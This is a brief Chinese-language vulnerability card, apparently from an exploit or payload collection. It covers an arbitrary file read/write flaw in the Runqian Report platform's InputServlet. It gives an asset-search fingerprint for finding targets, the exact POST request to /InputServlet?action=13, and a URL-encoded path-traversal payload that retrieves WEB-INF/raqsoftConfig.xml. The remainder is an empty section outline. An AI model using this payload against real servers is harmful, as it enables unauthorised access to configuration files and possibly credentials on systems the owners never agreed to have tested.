# 润乾报表InputServlet存在任意文件读取漏洞

- **系统**：润乾报表　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="润乾报表平台"`
- **请求**：`POST /InputServlet?action=13 HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config
```

**其他**
- 润乾报表InputServlet存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 润乾报表